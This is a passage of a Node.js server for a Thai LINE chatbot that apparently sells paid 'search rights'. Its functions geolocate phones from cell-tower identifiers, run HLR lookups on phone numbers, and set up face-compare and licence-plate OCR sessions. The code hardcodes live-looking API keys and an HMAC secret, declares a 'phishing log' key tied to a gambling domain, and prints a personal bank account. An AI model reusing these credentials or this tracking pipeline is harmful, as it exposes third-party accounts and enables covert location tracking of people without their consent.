require('dotenv').config();
const express = require('express');
const line = require('@line/bot-sdk');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const session = require('express-session');
const multer = require('multer');
const UNWIREDLABS_TOKEN = process.env.UNWIREDLABS_TOKEN;

const UNWIREDLABS_URL =
  'https://ap1.unwiredlabs.com/v2/process.php';
const GOOGLE_GEO_API_KEY = process.env.GOOGLE_GEO_API_KEY;
const SEARCH_LOG_FILE = path.join(__dirname, 'search_logs.json');
const supportSlipSessions = {};
const cheerio = require('cheerio');
const FormData = require('form-data');
const https = require('https');
const crypto = require('crypto');
const IAPP_API_KEY = 'iapp_live_ccd35e461ddb1ba1f44096afde50cff5118c2013eb30491047d7a5cd69dcc443';
const faceCompareSessions = {};
const plateOcrSessions = {};
const baseRequestSessions = {};
const PHISHING_LOG_API_KEY = 'api_fXLDx9XVRsF6sRZ3cBUDxWJVjLzD40jy';
const PHISHING_LOG_DOMAIN = 'ruay.ufabet996.com';
const phishingLoggerMap = {};

// =====================================
// PWA BRANCH DATABASE
// รายชื่อสาขาการประปาส่วนภูมิภาค
// =====================================

const PWA_BRANCH_FILE =
  path.join(
    __dirname,
    'pwa_branches.json'
  );

let PWA_BRANCH_DATABASE = null;


function loadPwaBranches() {

  if (PWA_BRANCH_DATABASE) {
    return PWA_BRANCH_DATABASE;
  }

  try {

    const raw =
      fs.readFileSync(
        PWA_BRANCH_FILE,
        'utf8'
      );

    const json =
      JSON.parse(raw);

    PWA_BRANCH_DATABASE =
      Array.isArray(json)
        ? json
        : Array.isArray(json.branches)
          ? json.branches
          : [];

    console.log(
      '✅ PWA BRANCH:',
      PWA_BRANCH_DATABASE.length,
      'branches'
    );

    return PWA_BRANCH_DATABASE;

  } catch (err) {

    console.error(
      '❌ PWA BRANCH ERROR:',
      err.message
    );

    PWA_BRANCH_DATABASE = [];

    return PWA_BRANCH_DATABASE;
  }
}

function searchPwaBranches(keyword) {

  const database =
    loadPwaBranches();

  const query =
    String(keyword || '')
      .trim()
      .toLowerCase();

  if (!query) {
    return database;
  }

  const cleanQuery =
    query
      .replace(/^กปภ\./, '')
      .replace(/^สาขา/, '')
      .trim();

  return database.filter(item => {

    const name =
      String(item?.name || '')
        .toLowerCase();

    const cleanName =
      name
        .replace(/^กปภ\./, '')
        .replace(/^สาขา/, '')
        .trim();

    return (
      name.includes(query) ||
      cleanName.includes(cleanQuery)
    );
  });
}

// =====================================
// ATM DATABASE
// =====================================

const ATM_DATA_FILE =
  path.join(
    __dirname,
    'atm_locations.json'
  );

let ATM_DATABASE = null;

function loadAtmDatabase() {

  if (ATM_DATABASE) {
    return ATM_DATABASE;
  }

  try {

    const raw =
      fs.readFileSync(
        ATM_DATA_FILE,
        'utf8'
      );

    const json =
      JSON.parse(raw);

    ATM_DATABASE =
      Array.isArray(json)
        ? json
        : Array.isArray(json.records)
          ? json.records
          : [];

    console.log(
      '✅ ATM DATABASE:',
      ATM_DATABASE.length,
      'records'
    );

    return ATM_DATABASE;

  } catch (err) {

    console.error(
      '❌ ATM DATABASE ERROR:',
      err.message
    );

    ATM_DATABASE = [];

    return ATM_DATABASE;
  }
}

// =====================================
// SEARCH ATM DATABASE
// =====================================

function normalizeAtmCode(value) {
  return String(value || '')
    .trim()
    .toUpperCase()
    .replace(/\s+/g, '');
}


function searchAtmDatabase(keyword) {

  const database =
    loadAtmDatabase();

  const input =
    String(keyword || '').trim();


  if (!input) {
    return [];
  }


  let bankCode = '';
  let atmCode = input;


  // รองรับรูปแบบ:
  // atm%014/0005
  if (input.includes('/')) {

    const parts =
      input.split('/');

    bankCode =
      String(parts.shift() || '')
        .trim();

    atmCode =
      parts.join('/')
        .trim();
  }


  // ปรับรหัสธนาคาร
  if (/^\d+$/.test(bankCode)) {

    bankCode =
      bankCode.padStart(3, '0');
  }


  const searchCode =
    normalizeAtmCode(atmCode);


  // กรณีเป็นตัวเลข
  // เช่น 5 ให้ค้นเจอ 0005
  const numericSearch =
    /^\d+$/.test(searchCode)
      ? searchCode.replace(
          /^0+(?=\d)/,
          ''
        )
      : null;


  return database.filter(item => {

    // =========================
    // ถ้าระบุรหัสธนาคาร
    // =========================

    if (bankCode) {

      const itemBankCode =
        String(
          item?.bankCode || ''
        )
          .trim()
          .padStart(3, '0');


      if (
        itemBankCode !== bankCode
      ) {
        return false;
      }
    }


    // =========================
    // ตรวจรหัสตู้
    // =========================

    const itemCode =
      normalizeAtmCode(
        item?.atmCode
      );


    // ตรงกันแบบเต็ม
    if (
      itemCode === searchCode
    ) {
      return true;
    }


    // กรณีเลข
    // 5 = 0005
    if (
      numericSearch !== null &&
      /^\d+$/.test(itemCode)
    ) {

      const numericItem =
        itemCode.replace(
          /^0+(?=\d)/,
          ''
        );


      return (
        numericItem ===
        numericSearch
      );
    }


    return false;
  });
}


// =====================================
// FORMAT ATM RESULT
// =====================================

function formatAtmSearchResult(
  results,
  keyword
) {

  if (
    !Array.isArray(results) ||
    results.length === 0
  ) {

    return (
` ▸ รายละเอียดจุดบริการ ATM

◇ ข้อมูลที่ใช้ค้นหา
  ${keyword}

❌ ไม่พบข้อมูลตู้ ATM`
    );
  }


  const items =
    results.map(
      (item, index) => {

        const lines = [];


        lines.push(
          ` รายการที่ ${index + 1}`
        );


        lines.push(
          `◇ ชื่อธนาคาร
  ${
            item.bankName || '-'
          }`
        );


        lines.push(
          `◇ รหัสประจำธนาคาร
  ${
            item.bankCode || '-'
          }`
        );


        lines.push(
          `◇ รหัสประจำตู้ ATM
  ${
            item.atmCode || '-'
          }`
        );


        if (item.location) {

          lines.push(
            `◇ บริเวณที่ติดตั้ง
  ${item.location}`
          );
        }


        if (item.branch) {

          lines.push(
            `◇ สาขาที่ระบุ
  ${item.branch}`
          );
        }


        if (item.branchCode) {

          lines.push(
            `◇ รหัสประจำสาขา
  ${item.branchCode}`
          );
        }


        if (item.address) {

          lines.push(
            `◇ รายละเอียดที่อยู่
  ${item.address}`
          );
        }


        if (item.subdistrict) {

          lines.push(
            `◇ เขตพื้นที่ตำบล/แขวง
  ${item.subdistrict}`
          );
        }


        if (item.district) {

          lines.push(
            `◇ เขตพื้นที่อำเภอ/เขต
  ${item.district}`
          );
        }


        if (item.province) {

          lines.push(
            `◇ จังหวัดที่ระบุ
  ${item.province}`
          );
        }


        if (item.postcode) {

          lines.push(
            `◇ หมายเลขรหัสไปรษณีย์
  ${item.postcode}`
          );
        }


        if (item.machineType) {

          lines.push(
            `◇ ชนิดของเครื่อง
  ${item.machineType}`
          );
        }


        if (item.installDate) {

          lines.push(
            `◇ วันดำเนินการติดตั้ง
  ${item.installDate}`
          );
        }


        return lines.join('\n');
      }
    )
      .join(
        "\n\n────────────\n\n"
      );


  const resultText =
` ▸ รายละเอียดจุดบริการ ATM

◇ ข้อมูลที่ใช้ค้นหา
  ${keyword}
✅ พบทั้งหมด ${results.length} รายการ

────────────

${items}`;


  return limitLineMessage(
    resultText
  );
}

async function lookupUnwiredCell({ radio, mcc, mnc, lac, cid }) {
  try {
    const payload = {
      token: UNWIREDLABS_TOKEN,
      radio: radio,
      mcc: Number(mcc),
      mnc: Number(mnc),
      cells: [
        {
          lac: Number(lac),
          cid: Number(cid),
          psc: 0
        }
      ],
      address: 1
    };

    const response = await axios.post(
      UNWIREDLABS_URL,
      payload,
      {
        headers: {
          'Content-Type': 'application/json'
        },
        timeout: 15000
      }
    );

    return response.data;

  } catch (error) {
    console.error(
      'Unwired Labs API error:',
      error.response?.data || error.message
    );

    throw error;
  }
}

async function autoLookupUnwiredCell(mcc, mnc, lac, cid) {
  const radios = ['umts', 'lte'];

  let lastResult = null;

  for (const radio of radios) {
    try {
      const result = await lookupUnwiredCell({
        radio,
        mcc,
        mnc,
        lac,
        cid
      });

      lastResult = result;

      if (
        result &&
        result.status === 'ok' &&
        Number.isFinite(Number(result.lat)) &&
        Number.isFinite(Number(result.lon))
      ) {
        return {
          ...result,
          radioUsed: radio
        };
      }

    } catch (error) {
      console.log(
        `Unwired Labs ${radio} lookup failed:`,
        error.message
      );
    }
  }

  return lastResult;
}

function saveSearchLog(
  userId,
  lineName,
  text,
  source = 'line',
  details = []
) {

  let logs = [];

  try {

    logs =
      JSON.parse(
        fs.readFileSync(
          SEARCH_LOG_FILE,
          'utf8'
        )
      );

  } catch {

    logs = [];

  }


  logs.unshift({
  userId,
  lineName,
  text,
  source,

  details:
    Array.isArray(details)
      ? details
      : [],

  time:
    new Date().toISOString()
});


  logs =
    logs.slice(
      0,
      10000
    );


  fs.writeFileSync(
    SEARCH_LOG_FILE,
    JSON.stringify(
      logs,
      null,
      2
    ),
    'utf8'
  );
}

async function googleCellGeo(mcc, mnc, lac, cid) {
  const res = await axios.post(
    `https://www.googleapis.com/geolocation/v1/geolocate?key=${GOOGLE_GEO_API_KEY}`,
    {
      cellTowers: [
        {
          mobileCountryCode: Number(mcc),
          mobileNetworkCode: Number(mnc),
          locationAreaCode: Number(lac),
          cellId: Number(cid)
        }
      ]
    }
  );

  return res.data;
}

async function searchHospital(keyword) {
  const { data } = await axios.get(DXC_BACKUP_API_BASE, {
    params: { sh: keyword, key: SEARCH_API_KEY },
    timeout: 45000
  });

  if (!data || data.success === false) {
    return `❌ ${data?.message || 'ค้นหาสถานพยาบาลไม่สำเร็จ กรุณาลองใหม่อีกครั้ง'}`;
  }

  const result = data.data || {};
  const items = Array.isArray(result.items) ? result.items : [];
  if (!items.length) {
    return `❌ ไม่พบข้อมูลสถานพยาบาลสำหรับ: ${keyword}`;
  }

  const lines = items.slice(0, 10).map((item, index) => [
    `${index + 1}. ${item.name || '-'}`,
    `รหัสหน่วยบริการ: ${item.code || '-'}`,
    `◇ รายละเอียดที่อยู่
  ${item.address || '-'}`,
    `พื้นที่: ${item.area || '-'}`,
    `สถานะ: ${item.status || '-'}`
  ].join('\n'));

  return limitLineMessage(
    ` ผลค้นหาสถานพยาบาล: ${keyword}\nพบ ${result.total ?? items.length} รายการ` +
    (result.total > items.length ? ` (แสดง ${items.length} รายการแรก)` : '') +
    `\n\n${lines.join('\n\n')}`
  );
}

async function fetchHlrLookup(msisdn) {
  const key = 'fcd01b61e422';
  const secret = 's7hE-jh43-C4hN-F!49-B!eC-e*7C';
  const timestamp = Math.floor(Date.now() / 1000);
  const endpoint = '/hlr-lookup';
  const data = { msisdn: msisdn };

  const signatureString = endpoint + timestamp.toString() + 'POST' + JSON.stringify(data);
  const signature = crypto.createHmac('sha256', secret).update(signatureString).digest('hex');

  const headers = {
    'User-Agent': 'node-sdk 2.0.2 (' + key + ')',
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'X-Digest-Key': key,
    'X-Digest-Signature': signature,
    'X-Digest-Timestamp': timestamp.toString()
  };

  try {
    return await axios.post('https://www.hlr-lookups.com/api/v2' + endpoint, data, { headers });
  } catch (error) {
    if (error.response) return error.response;
    throw error;
  }
}

async function askLaw(query) {

   try {

      const { data } = await axios.post(
         'https://api.iapp.co.th/thanoy',
         {
            query: query
         },
         {
            headers:{
               apikey:IAPP_API_KEY,
               'Content-Type':'application/json'
            },
            timeout:60000
         }
      );

      return data;

   } catch(err){

      console.log(
         'law error:',
         err.response?.data || err.message
      );

      return null;
   }

}

async function searchCheckMd(firstName, lastName) {
  const payload = new URLSearchParams({
    nm: firstName,
    lp: lastName,
    nm_en: '',
    lp_en: '',
    checkCode: '1',
    codecpe: ''
  });

  const response = await fetch('https://checkmd.tmc.or.th/v3/search', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Accept: 'text/html,application/json'
    },
    body: payload
  });

  const text = await response.text();

  if (!response.ok) {
    throw new Error(`CheckMD request failed: ${response.status} ${response.statusText}`);
  }

  try {
    return JSON.parse(text);
  } catch {
    return parseCheckMdResult(text);
  }
}

function parseCheckMdResult(html) {
  const $ = cheerio.load(html);
  const clean = (value) => String(value || '').replace(/\s+/g, ' ').trim();

  const result = {
    found: clean($('.panel-info > .panel-heading').first().text()),
    name_th: clean($('article strong').filter((_, el) => clean($(el).text()).startsWith('นพ.')).first().text()),
    name_en: clean($('article .text-info').first().text()),
    practice_since_th: clean($('article strong').filter((_, el) => clean($(el).text()).includes('เป็นผู้ประกอบวิชาชีพเวชกรรมตั้งแต่')).first().text()),
    practice_since_en: clean($('article .text-info span').first().text()),
    specialties: [],
    license_check: clean($('.panel-default .panel-body').first().contents().filter((_, node) => node.type === 'text').text())
  };

  $('.fa-ul.text-info li').each((_, el) => {
    const specialty = clean($(el).text());
    if (specialty && !result.specialties.includes(specialty)) {
      result.specialties.push(specialty);
    }
  });

  return result;
}

function formatCheckMdResult(result, query) {
  if (!result || result.error) {
    return `❌ ไม่พบข้อมูลแพทย์สำหรับ ${query}`;
  }

  if (typeof result === 'string') {
    return result || `❌ ไม่พบข้อมูลแพทย์สำหรับ ${query}`;
  }

  const lines = [
    ` ▸ สรุปข้อมูลแพทย์ที่ตรวจสอบ`,
    `◇ ข้อมูลที่ใช้ค้นหา
  ${query}`
  ];

  if (result.found) lines.push(`สถานะ: ${result.found}`);
  if (result.name_th) lines.push(`◇ ชื่อภาษาไทย
  ${result.name_th}`);
  if (result.name_en) lines.push(`◇ ชื่อภาษาอังกฤษ
  ${result.name_en}`);
  if (result.practice_since_th) lines.push(result.practice_since_th);
  if (result.practice_since_en) lines.push(result.practice_since_en);
  if (Array.isArray(result.specialties) && result.specialties.length) {
    lines.push(`◇ สาขาที่ระบุ
  ${result.specialties.join(', ')}`);
  }
  if (result.license_check) lines.push(`ตรวจสอบใบอนุญาต: ${result.license_check}`);

  if (lines.length <= 2) {
    lines.push('ไม่พบข้อมูลที่ตรงกับคำค้นหา');
  }

  return limitLineMessage(lines.join('\n'));
}

const app = express();

const CHANNEL_ACCESS_TOKEN = process.env.CHANNEL_ACCESS_TOKEN;
const CHANNEL_SECRET = process.env.CHANNEL_SECRET;
const PORT = process.env.PORT || 3000;

const BASE_URL = (process.env.BASE_URL || '').replace(/\/$/, '');

// ==============================
// LINE LOGIN CONFIG
// ==============================
const LINE_LOGIN_CHANNEL_ID =
  process.env.LINE_LOGIN_CHANNEL_ID;

const LINE_LOGIN_CHANNEL_SECRET =
  process.env.LINE_LOGIN_CHANNEL_SECRET;

const LINE_LOGIN_CALLBACK_URL =
  process.env.LINE_LOGIN_CALLBACK_URL ||
  `${BASE_URL}/line/callback`;

const WEB_SESSION_SECRET =
  process.env.WEB_SESSION_SECRET ||
  'change-this-secret';

const ADMIN_IDS = (process.env.LINE_ADMIN_USER_IDS || '')
  .split(',')
  .map(v => v.trim())
  .filter(Boolean);

// ==============================
// WEB SESSION สำหรับ LINE LOGIN
// ==============================
app.set('trust proxy', 1);

const webSession = session({
  secret: WEB_SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 30 * 60 * 1000
  }
});

app.use('/line', webSession);
app.use('/register', webSession);
app.use('/member', webSession);
app.use('/signal', webSession);
app.use('/support', webSession);
app.use('/moneyflow', webSession);

// ==============================
// REGISTER UPLOAD
// ==============================
const registerUploadDir = path.join(__dirname, 'uploads', 'register');

if (!fs.existsSync(registerUploadDir)) {
  fs.mkdirSync(registerUploadDir, { recursive: true });
}

const registrationUpload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => {
      cb(null, registerUploadDir);
    },

    filename: (req, file, cb) => {
      const ext =
        file.mimetype === 'image/png'
          ? '.png'
          : '.jpg';

      const randomName =
        crypto.randomBytes(12).toString('hex');

      cb(
        null,
        `member_${Date.now()}_${randomName}${ext}`
      );
    }
  }),

  limits: {
    fileSize: 5 * 1024 * 1024
  },

  fileFilter: (req, file, cb) => {
    const allowedTypes = [
      'image/jpeg',
      'image/png'
    ];

    if (!allowedTypes.includes(file.mimetype)) {
      return cb(
        new Error('รองรับเฉพาะไฟล์ JPG และ PNG')
      );
    }

    cb(null, true);
  }
});

// ==============================
// SIGNAL REQUEST PRIVATE UPLOAD
// ==============================

const signalStorageRoot =
  process.env.STORAGE_ROOT ||
  process.env.DATA_DIR ||
  __dirname;

const signalRequestUploadDir =
  path.join(
    signalStorageRoot,
    'private_uploads',
    'signal_requests'
  );

if (!fs.existsSync(signalRequestUploadDir)) {
  fs.mkdirSync(
    signalRequestUploadDir,
    { recursive: true }
  );
}

const signalRequestUpload = multer({

  storage: multer.diskStorage({

    destination: (req, file, cb) => {
      cb(null, signalRequestUploadDir);
    },

    filename: (req, file, cb) => {

      const ext =
        file.mimetype === 'image/png'
          ? '.png'
          : '.jpg';

      const randomName =
        crypto
          .randomBytes(16)
          .toString('hex');

      cb(
        null,
        `signal_${Date.now()}_${randomName}${ext}`
      );
    }

  }),

  limits: {
    fileSize: 8 * 1024 * 1024
  },

  fileFilter: (req, file, cb) => {

    const allowedTypes = [
      'image/jpeg',
      'image/png'
    ];

    if (!allowedTypes.includes(file.mimetype)) {
      return cb(
        new Error(
          'รองรับเฉพาะไฟล์ JPG และ PNG'
        )
      );
    }

    cb(null, true);
  }

});

// =====================================
// MEMBER SUPPORT
// =====================================

const SUPPORT_PACKAGES = {
  '30': {
    days: 30,
    amount: 499,
    label: '30 วัน'
  },

  '90': {
    days: 90,
    amount: 1299,
    label: '90 วัน'
  },

  '180': {
    days: 180,
    amount: 2500,
    label: '180 วัน'
  },

  '365': {
    days: 365,
    amount: 4999,
    label: '365 วัน'
  }
};


const supportUploadDir =
  path.join(
    process.env.STORAGE_ROOT ||
    process.env.DATA_DIR ||
    __dirname,
    'private_uploads',
    'support_slips'
  );


if (!fs.existsSync(supportUploadDir)) {
  fs.mkdirSync(
    supportUploadDir,
    { recursive: true }
  );
}


const supportUpload = multer({

  storage: multer.diskStorage({

    destination: (req, file, cb) => {
      cb(null, supportUploadDir);
    },

    filename: (req, file, cb) => {

      const ext =
        file.mimetype === 'image/png'
          ? '.png'
          : '.jpg';

      const randomName =
        crypto
          .randomBytes(16)
          .toString('hex');

      cb(
        null,
        `support_${Date.now()}_${randomName}${ext}`
      );
    }

  }),

  limits: {
    fileSize: 8 * 1024 * 1024
  },

  fileFilter: (req, file, cb) => {

    const allowed = [
      'image/jpeg',
      'image/png'
    ];

    if (!allowed.includes(file.mimetype)) {
      return cb(
        new Error(
          'รองรับเฉพาะไฟล์ JPG และ PNG'
        )
      );
    }

    cb(null, true);
  }

});

// =====================================
// MEMBER SUPPORT PAGE
// =====================================
app.get('/support', (req, res) => {

  const lineUser =
    req.session.lineUser;


  if (!lineUser?.userId) {

    return res.redirect(
      '/line/login?next=%2Fsupport'
    );

  }


  const db =
    loadDB();


  db.members =
    db.members || {};


  const member =
    db.members[
      lineUser.userId
    ];


  if (!member) {

    return res.status(403).send(
      '❌ ไม่พบข้อมูลสมาชิก กรุณาลงทะเบียนสมาชิกก่อน'
    );

  }


  const escapeHtml = (value = '') =>
    String(value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');


  const lineName =
    escapeHtml(
      member.lineName ||
      member.displayName ||
      lineUser.displayName ||
      '-'
    );


  const uid =
    escapeHtml(
      lineUser.userId
    );


  const phone =
    escapeHtml(
      member.phone || '-'
    );


  const pictureUrl =
    lineUser.pictureUrl
      ? escapeHtml(
          lineUser.pictureUrl
        )
      : '';


  const packageHtml =
    Object.entries(
      SUPPORT_PACKAGES
    )
      .map(
        ([key, pkg]) => `
<label class="package-card">

  <input
    type="radio"
    name="supportPackage"
    value="${key}"
    required
  >

  <div class="package-content">

    <div>

      <div class="package-days">
        ${pkg.label}
      </div>

      <div class="package-desc">
        เพิ่มสิทธิ์วันใช้งาน / สิทธิ์สืบค้น
      </div>

    </div>

    <div class="package-price">
      ${pkg.amount.toLocaleString('th-TH')} ฿
    </div>

  </div>

</label>
        `
      )
      .join('');


  return res.send(`
<!DOCTYPE html>

<html lang="th">

<head>

<meta charset="UTF-8">

<meta
  name="viewport"
  content="width=device-width, initial-scale=1.0"
>

<title>
  ระบบสนับสนุนสมาชิก
</title>


<style>

* {
  box-sizing: border-box;
}

body {
  margin: 0;

  min-height: 100vh;

  padding: 18px;

  background: #070b11;

  color: #e5e7eb;

  font-family:
    Arial,
    Tahoma,
    sans-serif;
}

.container {
  width: 100%;
  max-width: 580px;

  margin: 15px auto 50px;

  padding: 24px;

  background: #10161f;

  border: 1px solid #293747;
  border-radius: 22px;
}

.title {
  color: #ffffff;

  font-size: 21px;
  font-weight: bold;
}

.subtitle {
  margin-top: 7px;

  color: #94a3b8;

  font-size: 12px;
  line-height: 1.7;
}


/* PROFILE */

.profile {
  display: flex;
  align-items: center;

  gap: 14px;

  margin-top: 20px;

  padding: 15px;

  background: #080d13;

  border: 1px solid #293747;
  border-radius: 14px;
}

.avatar {
  width: 62px;
  height: 62px;

  border-radius: 50%;

  object-fit: cover;

  background: #1e293b;
}

.name {
  color: #ffffff;

  font-size: 16px;
  font-weight: bold;
}

.profile-info {
  margin-top: 4px;

  color: #94a3b8;

  font-size: 10px;

  line-height: 1.6;

  word-break: break-all;
}


/* SECTION */

.divider {
  border: 0;

  border-top:
    1px solid #293747;

  margin: 25px 0;
}

.section-title {
  margin-bottom: 12px;

  color: #ffffff;

  font-size: 16px;
  font-weight: bold;
}


/* BANK */

.bank-card {
  padding: 18px;

  background: #080d13;

  border: 1px solid #334155;
  border-radius: 14px;
}

.bank-name {
  color: #ffffff;

  font-size: 15px;
  font-weight: bold;
}

.account-number {
  margin-top: 12px;

  color: #d7b56d;

  font-size: 23px;
  font-weight: bold;

  letter-spacing: 1px;
}

.account-name {
  margin-top: 7px;

  color: #cbd5e1;

  font-size: 13px;
}


/* PACKAGE */

.package-card {
  display: block;

  margin-bottom: 10px;

  cursor: pointer;
}

.package-card input {
  display: none;
}

.package-content {
  display: flex;

  align-items: center;
  justify-content: space-between;

  gap: 12px;

  padding: 15px;

  background: #080d13;

  border: 1px solid #334155;
  border-radius: 12px;
}

.package-card input:checked
+ .package-content {
  border-color: #d7b56d;

  background: #17140c;
}

.package-days {
  color: #ffffff;

  font-size: 14px;
  font-weight: bold;
}

.package-desc {
  margin-top: 4px;

  color: #64748b;

  font-size: 10px;
}

.package-price {
  flex-shrink: 0;

  color: #d7b56d;

  font-size: 17px;
  font-weight: bold;
}


/* UPLOAD */

.upload-box {
  display: block;

  padding: 25px 15px;

  background: #080d13;

  border: 1px dashed #52657c;
  border-radius: 13px;

  text-align: center;

  cursor: pointer;
}

.upload-box input {
  display: none;
}

.upload-icon {
  font-size: 30px;
}

.upload-title {
  margin-top: 7px;

  color: #ffffff;

  font-size: 13px;
  font-weight: bold;
}

.upload-help {
  margin-top: 6px;

  color: #64748b;

  font-size: 10px;
}

.file-name {
  margin-top: 10px;

  color: #d7b56d;

  font-size: 11px;

  word-break: break-all;
}


/* NOTICE */

.notice {
  margin-top: 20px;

  padding: 14px;

  background: #0b1720;

  border: 1px solid #23445a;
  border-radius: 11px;

  color: #94a3b8;

  font-size: 11px;
  line-height: 1.7;
}


/* BUTTON */

button {
  width: 100%;

  height: 53px;

  margin-top: 20px;

  border: 0;
  border-radius: 11px;

  background: #d7b56d;

  color: #111111;

  font-size: 15px;
  font-weight: bold;

  cursor: pointer;
}

button:disabled {
  opacity: .45;
}

</style>

</head>


<body>


<div class="container">


  <div class="title">

    💛 ระบบสนับสนุนสมาชิก

  </div>


  <div class="subtitle">

    เพิ่มสิทธิ์วันใช้งาน /
    เพิ่มสิทธิ์สืบค้นข้อมูล

  </div>


  <div class="profile">

    ${
      pictureUrl
        ? `
<img
  class="avatar"
  src="${pictureUrl}"
  alt="LINE Profile"
>
        `
        : `
<div class="avatar"></div>
        `
    }


    <div>

      <div class="name">
        ${lineName}
      </div>

      <div class="profile-info">
        เบอร์สมาชิก : ${phone}
      </div>

      <div class="profile-info">
        UID : ${uid}
      </div>

    </div>

  </div>


  <hr class="divider">


  <div class="section-title">

    🏦 ช่องทางสนับสนุน

  </div>


  <div class="bank-card">

    <div class="bank-name">
      🏦 ธนาคาร : กสิกร
    </div>

    <div class="account-number">
      223-8-45775-3
    </div>

    <div class="account-name">
      TATTHEP KONGTHAP
    </div>

  </div>


  <hr class="divider">


  <div class="section-title">

    📅 เลือกระยะเวลาสนับสนุน

  </div>


  <form
    id="supportForm"
    method="POST"
    action="/support"
    enctype="multipart/form-data"
  >


    ${packageHtml}


    <hr class="divider">


    <div class="section-title">

      🧾 แนบสลิปสนับสนุน

    </div>


    <label class="upload-box">

      <input
        id="slip"
        type="file"
        name="slip"
        accept="image/jpeg,image/png"
        required
      >


      <div class="upload-icon">
        📎
      </div>


      <div class="upload-title">
        อัปโหลดสลิปสนับสนุน
      </div>


      <div class="upload-help">
        รองรับ JPG / PNG สูงสุด 8 MB
      </div>


      <div
        id="fileName"
        class="file-name"
      >
      </div>


    </label>


    <div class="notice">

      ℹ️ หลังจากส่งสลิป
      ระบบจะแจ้งข้อมูลไปยังผู้ดูแลระบบ
      เพื่อทำการตรวจสอบ

      <br><br>

      กรุณาตรวจสอบแพ็กเกจ
      และยอดสนับสนุนให้ถูกต้อง
      ก่อนส่งข้อมูล

    </div>


    <button
      id="submitButton"
      type="submit"
    >

      📤 ส่งสลิปสนับสนุน

    </button>


  </form>


</div>


<script>

const slip =
  document.getElementById('slip');

const fileName =
  document.getElementById(
    'fileName'
  );


if (
  slip &&
  fileName
) {

  slip.addEventListener(
    'change',
    function () {

      if (
        this.files &&
        this.files.length
      ) {

        fileName.textContent =
          'ไฟล์ที่เลือก : ' +
          this.files[0].name;

      } else {

        fileName.textContent = '';

      }

    }
  );

}


const supportForm =
  document.getElementById(
    'supportForm'
  );

const submitButton =
  document.getElementById(
    'submitButton'
  );


if (
  supportForm &&
  submitButton
) {

  supportForm.addEventListener(
    'submit',
    function () {

      submitButton.disabled =
        true;

      submitButton.textContent =
        '⏳ กำลังส่งสลิป...';

    }
  );

}

</script>


</body>

</html>
  `);

});

// =====================================
// MEMBER SUPPORT SUBMIT
// =====================================
app.post('/support', (req, res) => {

  supportUpload.single('slip')(
    req,
    res,
    async (uploadErr) => {

      const deleteSlip = () => {

        if (req.file?.path) {

          fs.unlink(
            req.file.path,
            () => {}
          );

        }

      };


      try {

        if (uploadErr) {

          return res.status(400).send(
            '❌ อัปโหลดสลิปไม่สำเร็จ: ' +
            uploadErr.message
          );

        }


        const lineUser =
          req.session.lineUser;


        if (!lineUser?.userId) {

          deleteSlip();

          return res.redirect(
            '/line/login?next=%2Fsupport'
          );

        }


        const db =
          loadDB();


        db.members =
          db.members || {};


        db.supportRequests =
          db.supportRequests || {};


        const member =
          db.members[
            lineUser.userId
          ];


        if (!member) {

          deleteSlip();

          return res.status(403).send(
            '❌ ไม่พบข้อมูลสมาชิก'
          );

        }


        const packageKey =
          String(
            req.body.supportPackage || ''
          );


        const selectedPackage =
          SUPPORT_PACKAGES[
            packageKey
          ];


        if (!selectedPackage) {

          deleteSlip();

          return res.status(400).send(
            '❌ กรุณาเลือกแพ็กเกจสนับสนุน'
          );

        }


        if (!req.file) {

          return res.status(400).send(
            '❌ กรุณาแนบสลิปสนับสนุน'
          );

        }


        const requestId =
          'SUP-' +
          Date.now()
            .toString(36)
            .toUpperCase() +
          '-' +
          crypto
            .randomBytes(3)
            .toString('hex')
            .toUpperCase();


        // Token สำหรับเปิดดูสลิป
        const slipViewToken =
          crypto
            .randomBytes(32)
            .toString('hex');


        const createdAt =
          new Date().toISOString();


        db.supportRequests[
          requestId
        ] = {

          requestId,

          userId:
            lineUser.userId,

          lineName:
            lineUser.displayName ||
            member.lineName ||
            member.displayName ||
            '',

          memberPhone:
            member.phone || '',


          packageKey,

          days:
            selectedPackage.days,

          amount:
            selectedPackage.amount,


          slipFile:
            req.file.filename,

          slipMimeType:
            req.file.mimetype,

          slipViewToken,


          status:
            'pending',

          createdAt

        };


        saveDB(db);


        const supportBaseUrl =
          BASE_URL ||
          'https://memegabot.com';


        const slipUrl =
          `${supportBaseUrl}/support/slip/${requestId}/${slipViewToken}`;


        // =================================
        // FLEX แจ้ง ADMIN
        // =================================

        const adminFlex = {

          type: 'flex',

          altText:
            " มีสลิปสนับสนุนสมาชิกใหม่",

          contents: {

            type: 'bubble',

            size: 'mega',


            header: {

              type: 'box',

              layout: 'vertical',

              backgroundColor:
                '#0F172A',

              paddingAll:
                '18px',

              contents: [

                {
                  type: 'text',

                  text:
                    " สลิปสนับสนุนสมาชิก",

                  color:
                    '#FFFFFF',

                  weight:
                    'bold',

                  size:
                    'lg',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
                    `เลขคำขอ : ${requestId}`,

                  color:
                    '#94A3B8',

                  size:
                    'xs',

                  margin:
                    'sm'
                }

              ]
            },


            body: {

              type: 'box',

              layout: 'vertical',

              spacing:
                'md',

              paddingAll:
                '18px',

              contents: [

                {
                  type: 'text',

                  text:
                    " ข้อมูลสมาชิก",

                  weight:
                    'bold'
                },


                {
                  type: 'text',

                  text:
                    `LINE : ${
                      lineUser.displayName ||
                      member.lineName ||
                      '-'
                    }`,

                  size:
                    'sm',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
                    `UID : ${lineUser.userId}`,

                  size:
                    'xs',

                  color:
                    '#64748B',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
                    `เบอร์สมาชิก : ${
                      member.phone || '-'
                    }`,

                  size:
                    'sm',

                  wrap:
                    true
                },


                {
                  type: 'separator',

                  margin:
                    'md'
                },


                {
                  type: 'text',

                  text:
                    ` แพ็กเกจ : ${selectedPackage.label}`,

                  weight:
                    'bold',

                  margin:
                    'md',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
